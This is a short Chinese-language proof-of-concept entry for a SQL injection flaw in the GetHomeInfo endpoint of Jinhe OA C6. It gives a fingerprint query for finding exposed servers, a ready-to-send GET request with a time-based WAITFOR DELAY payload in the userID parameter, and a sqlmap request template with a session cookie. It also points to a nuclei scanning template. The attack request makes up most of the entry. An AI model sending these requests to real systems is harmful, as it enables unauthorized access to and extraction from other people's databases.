# 金和OAC6GetHomeInfo存在SQL注入漏洞

- **系统**：金和OA　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="金和 OA"`
- **请求**：`GET /c6/jhsoft.mobileapp/AndroidSevices/HomeService.asmx/GetHomeInfo?userID=1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27-- HTTP/1.1`
- **关键头**：`Host: {hostname}`　`Cookie: ASP.NET_SessionId=hy05110dudz1c1vbtugwg1b1; myie=false`

**请求体 / payload**
```

sqlmap
GET /c6/jhsoft.mobileapp/AndroidSevices/HomeService.asmx/GetHomeInfo?userID=1 HTTP/1.1
Host: {hostname}
Cookie: ASP.NET_SessionId=hy05110dudz1c1vbtugwg1b1; myie=false

nuclei脚本\
\[金和-c6-gethomeinfo-sql注入.yaml]\(公众号：渗透安全HackTwo
```

**其他**
- 金和OA C6 GetHomeInfo存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 金和OA